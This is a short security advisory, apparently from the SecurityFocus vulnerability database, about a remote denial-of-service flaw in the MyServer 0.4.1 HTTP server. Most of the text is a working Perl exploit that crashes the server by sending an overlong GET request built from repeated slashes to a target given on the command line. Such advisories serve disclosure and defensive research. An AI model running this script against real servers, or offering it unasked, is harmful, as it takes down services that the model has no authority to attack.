source: http://www.securityfocus.com/bid/8010/info

MyServer HTTP server has been reported prone to a remote denial of service attack.

The issue presents itself, likely due to a lack of sufficient bounds checking, performed on arguments that are supplied via malicious HTTP GET requests. It has been reported that a remote attacker may invoke a malicious HTTP GET request containing excessive data, that will supposedly trigger a segmentation fault in the server executable and the software will fail. 

#!/usr/bin/perl

#Myserver 0.4.1 Remote Denial of service ;)
#oh joy...
#deadbeat, uk2sec
#eip@oakey.no-ip.com
#deadbeat@sdf.lonestar.org

use IO::Socket;
$dos = "//"x100;
$request = "GET $dos"."HTTP/1.0\r\n\r\n";

$target = $ARGV[0];

print "\n\nMyserver 0.4.1 Remote Denial Of Service..\n";
print "deadbeat, uk2sec..\n";
print "usage: perl $0 <target>\n";
$sox = IO::Socket::INET->new(
        Proto=>"tcp",
        PeerPort=>"80",
        PeerAddr=>"$target"
)or die "\nCan't connect to $target..\n";
print $sox $request;
sleep 2;
close $sox;
print "Done...\n";